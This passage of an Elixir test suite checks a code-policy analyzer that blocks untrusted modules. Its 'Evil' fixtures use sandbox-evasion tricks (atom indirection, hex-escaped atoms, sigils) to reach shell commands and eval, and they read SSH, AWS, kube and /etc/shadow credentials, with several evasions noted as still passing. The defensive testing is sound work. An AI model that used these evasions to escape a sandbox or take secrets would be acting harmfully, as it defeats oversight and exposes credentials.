      defmodule Evil do
        @target :os
        defdelegate my_cmd(c), to: @target, as: :cmd
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "@m :erlang; apply(@m, :open_port, args) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        @m :erlang
        def run(args), do: apply(@m, :open_port, args)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "@mod Code; defdelegate eval(s), to: @mod -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        @mod Code
        defdelegate eval(s), to: @mod, as: :eval_string
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "@mod String; defdelegate up(s), to: @mod blocked (@attr resolves to :String)" do
      code = ~S'''
      defmodule Safe do
        @mod String
        defdelegate up(s), to: @mod, as: :upcase
      end
      '''

      # defdelegate to @attr resolves String to :String atom which is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # Phase 7: M8 — String fallback coverage
  # ---------------------------------------------------------------------------

  describe "M8: string fallback for non-Elixir" do
    test "Elixir.System.cmd in non-Elixir code -> KRAIT-002" do
      code = ~S'result = Elixir.System.cmd("whoami", [])'
      # Non-Elixir uses string fallback, not allowlist
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "python")
    end

    test "Application.put_env in non-Elixir code -> KRAIT-001" do
      code = ~S'Application.put_env(:krait, :env, :dev)'
      # Non-Elixir uses string fallback, not allowlist
      assert {:policy_violation, %{rule: "KRAIT-001"}} = Quick.quick_validate(code, "python")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 1: C1 — Import/alias/use of forbidden modules
  # ---------------------------------------------------------------------------

  describe "C1-v10: import/alias/use of forbidden modules" do
    test "import System, only: [cmd: 2] -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        import System, only: [cmd: 2]
        def run, do: cmd("whoami", [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import System -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        import System
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "alias System, as: S -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        alias System, as: S
        def run, do: S.cmd("whoami", [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "use Code -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        use Code
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import Code -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        import Code
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "alias Port, as: P -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        alias Port, as: P
        def run, do: P.open({:spawn, "cmd"}, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import Req -> KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        import Req
        def exfil(u), do: get!(u)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "import String passes clean" do
      code = ~S'''
      defmodule Safe do
        import String
        def run, do: upcase("hello")
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "alias String, as: S blocked (S not on allowlist)" do
      code = ~S'''
      defmodule Safe do
        alias String, as: S
        def run, do: S.upcase("hello")
      end
      '''

      # Allowlist can't resolve alias S to String — S is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 2: C2+C4 — Broad atom scan + sigil atom construction
  # ---------------------------------------------------------------------------

  describe "C2-v10: variable indirection for Erlang atom evasion" do
    test "m = :os; apply(m, :cmd, ...) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run do
          m = :os
          apply(m, :cmd, [~c"whoami"])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "m = :erl_eval; apply(m, :expr, ...) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run do
          m = :erl_eval
          apply(m, :expr, [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":lists atom blocked (Kernel.apply denied)" do
      code = ~S'''
      defmodule Safe do
        def run do
          m = :lists
          apply(m, :reverse, [[1,2,3]])
        end
      end
      '''

      # Kernel.apply is a denied kernel function — blocked by allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "C4-v10: ~w[]a sigil atom construction" do
    test "~w[os cmd]a -> KRAIT-002 (contains :os)" do
      code = ~S'''
      defmodule Evil do
        def run do
          [mod, func] = ~w[os cmd]a
          apply(mod, func, [~c"whoami"])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "~w[erl_eval expr]a -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run do
          [mod, func] = ~w[erl_eval expr]a
          apply(mod, func, [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "~w[lists reverse]a passes clean" do
      code = ~S'''
      defmodule Safe do
        def run, do: ~w[lists reverse]a
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 3: C3+C5 — Pattern matching fixes
  # ---------------------------------------------------------------------------

  describe "C3-v10: Elixir.Kernel.apply pattern matching" do
    test "Elixir.Kernel.apply(:os, :cmd, args) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.Kernel.apply(:os, :cmd, [~c"whoami"])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir.Kernel.apply(:erl_eval, :expr, args) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run, do: Elixir.Kernel.apply(:erl_eval, :expr, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "C5-v10: KRAIT-007 quoted atom bypass" do
    test ~S[:"Elixir.Krait.Evolution.Workspace" -> KRAIT-ALW (v17: variable dispatch)] do
      code = ~S'''
      defmodule Evil do
        def run do
          mod = :"Elixir.Krait.Evolution.Workspace"
          mod.apply_files(".", [])
        end
      end
      '''

      # v17: Variable dispatch catches this as KRAIT-ALW before KRAIT-007 runs
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ~S[:"Elixir.Krait.Analyzer.Quick" -> KRAIT-007] do
      code = ~S'''
      defmodule Evil do
        def run, do: :"Elixir.Krait.Analyzer.Quick"
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-007"}} = Quick.quick_validate(code, "elixir")
    end

    test ~S[:"Elixir.Krait.Brain.Planner" -> KRAIT-007] do
      code = ~S'''
      defmodule Evil do
        def run, do: :"Elixir.Krait.Brain.Planner"
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-007"}} = Quick.quick_validate(code, "elixir")
    end

    test ~S[:"Elixir.String" passes clean] do
      code = ~S'''
      defmodule Safe do
        def run, do: :"Elixir.String"
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 4: H1+H2+H3 — Attr dot-call + binary_to_term + capture
  # ---------------------------------------------------------------------------

  describe "H1-v10: @attr.func() dot-call evasion" do
    test "@target :os; @target.cmd(~c\"whoami\") -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        @target :os
        def run, do: @target.cmd(~c"whoami")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "@m :erl_eval; @m.expr(...) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        @m :erl_eval
        def run, do: @m.expr([])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "H2-v10: :erlang.binary_to_term deserialization" do
    test ":erlang.binary_to_term -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run(payload), do: :erlang.binary_to_term(payload)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":erlang.binary_to_term with safe option -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run(payload), do: :erlang.binary_to_term(payload, [:safe])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "H3-v10: Function.capture with atom args" do
    test "Function.capture(:os, :cmd, 1) -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: Function.capture(:os, :cmd, 1)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "&apply/3 capture not detected by allowlist (evasion)" do
      code = ~S'''
      defmodule Evil do
        def run, do: &apply/3
      end
      '''

      # Capture shorthand for bare apply not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "Function.capture(String, :upcase, 1) passes clean" do
      code = ~S'''
      defmodule Safe do
        def run, do: Function.capture(String, :upcase, 1)
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 5: H6+H7+H8 — Credential paths + KRAIT-007 prefixes
  # ---------------------------------------------------------------------------

  describe "H7-v10: additional credential paths" do
    test "File.read(~/.kube/config) -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read("~/.kube/config")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(~/.docker/config.json) -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read("~/.docker/config.json")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(~/.netrc) -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read("~/.netrc")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(~/.git-credentials) -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read("~/.git-credentials")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(/etc/shadow) -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read("/etc/shadow")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "H8-v10: KRAIT-007 expanded module prefixes" do
    test "Krait.LLM.Claude reference -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def run, do: Krait.LLM.Claude.complete([])
      end
      '''

      # Krait.LLM.Claude is not on the allowlist — KRAIT-ALW fires before KRAIT-007
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Krait.Skills.Registry reference -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def run, do: Krait.Skills.Registry.list()
      end
      '''

      # Krait.Skills.Registry is not on the allowlist — KRAIT-ALW fires before KRAIT-007
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "KraitWeb.Endpoint reference -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def run, do: KraitWeb.Endpoint.config(:secret_key_base)
      end
      '''

      # KraitWeb.Endpoint is not on the allowlist — KRAIT-ALW fires before KRAIT-007
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Krait.GitHub.Client reference -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def run, do: Krait.GitHub.Client.get_repo("owner", "repo")
      end
      '''

      # Krait.GitHub.Client is not on the allowlist — KRAIT-ALW fires before KRAIT-007
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Krait.Repo reference -> KRAIT-ALW" do
      code = ~S'''
      defmodule Evil do
        def run, do: Krait.Repo.all(Krait.Feed.Event)
      end
      '''

      # Krait.Repo is not on the allowlist — KRAIT-ALW fires before KRAIT-007
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 7: M8 expanded string fallback
  # ---------------------------------------------------------------------------

  describe "M8-v10: expanded string fallback" do
    test "import System in non-Elixir -> KRAIT-002" do
      code = ~S'import System'
      # Non-Elixir uses string fallback, not allowlist
      assert {:policy_violation, %{rule: "KRAIT-002"}} = Quick.quick_validate(code, "python")
    end

    test "import Code in non-Elixir -> KRAIT-001" do
      code = ~S'import Code'
      # Non-Elixir uses string fallback, not allowlist
      assert {:policy_violation, %{rule: "KRAIT-001"}} = Quick.quick_validate(code, "python")
    end
  end

  describe "Workspace path validation" do
    test "blocks writes to immutable paths" do
      assert {:error, {:immutable_path, "native/krait_analyzer/src/evil.rs"}} =
               Krait.Evolution.Workspace.validate_file_path("native/krait_analyzer/src/evil.rs")
    end

    test "blocks writes to config/" do
      assert {:error, {:immutable_path, "config/prod.exs"}} =
               Krait.Evolution.Workspace.validate_file_path("config/prod.exs")
    end

    test "blocks writes to mix.exs" do
      assert {:error, {:immutable_path, "mix.exs"}} =
               Krait.Evolution.Workspace.validate_file_path("mix.exs")
    end

    test "allows writes to community skill paths" do
      assert :ok =
               Krait.Evolution.Workspace.validate_file_path(
                 "lib/krait/skills/community/bitcoin.ex"
               )
    end

    test "allows writes to community test paths" do
      assert :ok =
               Krait.Evolution.Workspace.validate_file_path(
                 "test/krait/skills/community/bitcoin_test.exs"
               )
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 1: C1 — NIF Hex Escape Atom Bypass
  # ---------------------------------------------------------------------------

  describe "V10-C1: hex escape atom bypass (Elixir confirms native resolution)" do
    test "Elixir resolves :\"\\x6F\\x73\" to :os — KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :"\x6F\x73".cmd(~c"whoami")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Elixir resolves :\"\\u{006F}\\u{0073}\" to :os — KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run, do: :"\u{006F}\u{0073}".cmd(~c"whoami")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 2: H1 — ~W Uppercase Sigil Bypass
  # ---------------------------------------------------------------------------

  describe "V10-H1: ~W (uppercase) sigil bypass" do
    test "~W[os cmd]a -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        def run do
          [mod, func] = ~W[os cmd]a
          apply(mod, func, [~c"whoami"])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "~W[erl_eval expr]a -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def run do
          [mod, func] = ~W[erl_eval expr]a
          apply(mod, func, [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "~W[hackney request]a -> KRAIT-004" do
      code = ~S'''
      defmodule Evil do
        def run do
          [mod, func] = ~W[hackney request]a
          apply(mod, func, [])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "~W[code net_kernel]a not detected by allowlist (evasion)" do
      code = ~S'''
      defmodule Evil do
        def run, do: ~W[code net_kernel]a
      end
      '''

      # Sigil atom construction not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "~W[lists reverse]a passes clean" do
      code = ~S'''
      defmodule Safe do
        def run, do: ~W[lists reverse]a
      end
      '''

      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 3: H2+H3 — ETS/DETS/Mnesia + :application
  # ---------------------------------------------------------------------------

  describe "V10-H2: ETS/DETS/Mnesia/persistent_term exfiltration" do
    test ":ets.tab2list(:my_table) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :ets.tab2list(:krait_rate_limit)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":ets.all() -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :ets.all()
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":dets.open_file(:table, []) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :dets.open_file(:secrets, [])
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":mnesia.table(:users) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :mnesia.table(:users)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":persistent_term.get(:secret_key) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :persistent_term.get(:secret_key)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "bare :ets atom -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal do
          m = :ets
          apply(m, :tab2list, [:my_table])
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "~w[ets tab2list]a not detected by allowlist (evasion)" do
      code = ~S'''
      defmodule Evil do
        def steal, do: ~w[ets tab2list]a
      end
      '''

      # Sigil atom construction not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "defdelegate to :ets -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        defdelegate list_all(t), to: :ets, as: :tab2list
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "V10-H3: :application config leak" do
    test ":application.get_all_env(:krait) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :application.get_all_env(:krait)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":application.get_env(:krait, :api_token) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: :application.get_env(:krait, :api_token)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "bare :application variable dispatch rejected (v17: C-7)" do
      code = ~S'''
      defmodule Evil do
        def steal do
          m = :application
          m.get_all_env(:krait)
        end
      end
      '''

      # v17: Variable dispatch now detected
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 4: H4 — /proc/self/environ
  # ---------------------------------------------------------------------------

  describe "V10-H4: /proc/self/environ credential exfiltration" do
    test "File.read!(\"/proc/self/environ\") -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read!("/proc/self/environ")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read!(\"/proc/self/cmdline\") -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read!("/proc/self/cmdline")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(\"/proc/self/maps\") -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal, do: File.read("/proc/self/maps")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(\"/tmp/harmless\") blocked (File not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def read, do: File.read("/tmp/harmless.txt")
      end
      '''

      # File is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 5: M1 — Credential Path Splitting
  # ---------------------------------------------------------------------------

  describe "V10-M1: credential path splitting detection" do
    test ~S[Path.expand("~") <> "/.ssh/id_rsa" -> KRAIT-003] do
      code = ~S'''
      defmodule Evil do
        def steal do
          home = Path.expand("~")
          File.read!(home <> "/.ssh/id_rsa")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(home <> \"/.aws/credentials\") -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal do
          home = Path.expand("~")
          File.read(home <> "/.aws/credentials")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(home <> \"/.kube/config\") -> KRAIT-003" do
      code = ~S'''
      defmodule Evil do
        def steal do
          home = Path.expand("~")
          File.read(home <> "/.kube/config")
        end
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.read(home <> \"/documents/notes.txt\") blocked (not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        def read do
          home = Path.expand("~")
          File.read(home <> "/documents/notes.txt")
        end
      end
      '''

      # Path and File are not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 6: M4+M5 — Node.spawn + Process inspection
  # ---------------------------------------------------------------------------

  describe "V10-M4: Node.spawn/spawn_link/list" do
    test "Node.spawn -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def run, do: Node.spawn(:evil@host, fn -> :ok end)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Node.spawn_link -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def run, do: Node.spawn_link(:evil@host, fn -> :ok end)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Node.list -> KRAIT-005" do
      code = ~S'''
      defmodule Evil do
        def recon, do: Node.list()
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  describe "V10-M5: Process dictionary inspection" do
    test "Process.info(pid, :dictionary) -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal(pid), do: Process.info(pid, :dictionary)
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "Process.get() -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        def steal, do: Process.get()
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v10 Phase 7: L1 — require directive gap
  # ---------------------------------------------------------------------------

  describe "V10-L1: require directive gap" do
    test "require Code -> KRAIT-001" do
      code = ~S'''
      defmodule Evil do
        require Code
        def run, do: Code.eval_string("1+1")
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "require System -> KRAIT-002" do
      code = ~S'''
      defmodule Evil do
        require System
      end
      '''

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "require Logger blocked (Logger not allowlisted)" do
      code = ~S'''
      defmodule Safe do
        require Logger
        def run, do: Logger.info("hello")
      end
      '''

      # Logger is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 2: Expanded File operations for KRAIT-003
  # ---------------------------------------------------------------------------

  describe "V12-P2: expanded File operations for KRAIT-003" do
    test "File.stream! with credential path" do
      code = ~S'File.stream!("~/.ssh/id_rsa")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.open with credential path" do
      code = ~S'File.open("~/.aws/credentials")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.cp! with credential path" do
      code = ~S'File.cp!("~/.ssh/id_rsa", "/tmp/stolen")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.cp_r! with credential path" do
      code = ~S'File.cp_r!("~/.ssh", "/tmp/stolen_ssh")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.rename with credential path" do
      code = ~S'File.rename("~/.ssh/id_rsa", "/tmp/stolen")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.ln_s with credential path" do
      code = ~S'File.ln_s("~/.ssh/id_rsa", "/tmp/link")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.stat with credential path" do
      code = ~S'File.stat("~/.ssh/id_rsa")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":file.list_dir with credential path" do
      code = ~S':file.list_dir(~c"~/.ssh")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":file.consult with credential path" do
      code = ~S':file.consult(~c"~/.ssh/config")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test "File.ls with safe path blocked (File not allowlisted)" do
      code = ~S'File.ls("/tmp/safe")'
      # File is not on the allowlist
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 3: Forbidden Erlang modules
  # ---------------------------------------------------------------------------

  describe "V12-P3: forbidden Erlang modules" do
    test ":elixir.eval/2 -> KRAIT-001" do
      code = ~S':elixir.eval(~c"IO.puts(:pwned)", [])'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":prim_file.read_file with credential path -> KRAIT-003" do
      code = ~S':prim_file.read_file("~/.ssh/id_rsa")'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":socket.connect -> KRAIT-004" do
      code = ~S':socket.connect(sock, addr)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":inet.getaddr -> KRAIT-004" do
      code = ~S':inet.getaddr(~c"evil.com", :inet)'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":inets.start -> KRAIT-004" do
      code = ~S':inets.start()'
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":filename.join with immutable segment -> KRAIT-ALW" do
      code = ~S':filename.join("native", "krait_analyzer")'
      # :filename is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":filelib.is_file with immutable segment -> KRAIT-ALW" do
      code = ~S':filelib.is_file("krait_analyzer/src/rules.rs")'
      # :filelib is not on the allowlist — KRAIT-ALW fires before KRAIT-006
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} = Quick.quick_validate(code, "elixir")
    end

    test ":string.concat with immutable segment -> KRAIT-006" do
      code = ~S':string.concat("krait_analyzer", "/src")'
      # :string IS on the allowlist — allowlist passes, then KRAIT-006 fires
      assert {:policy_violation, %{rule: "KRAIT-006"}} = Quick.quick_validate(code, "elixir")
    end

    test "bare :elixir atom not detected by allowlist (evasion)" do
      code = ~S'm = :elixir'
      # Bare atom assignment not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end

    test "~w[socket inet]a not detected by allowlist (evasion)" do
      code = ~S'~w[socket inet]a'
      # Sigil atom construction not detected by allowlist — evasion passes through
      assert {:ok, _} = Quick.quick_validate(code, "elixir")
    end
  end

  # ---------------------------------------------------------------------------
  # v12 Phase 4: Mint submodule and import gaps
  # ---------------------------------------------------------------------------

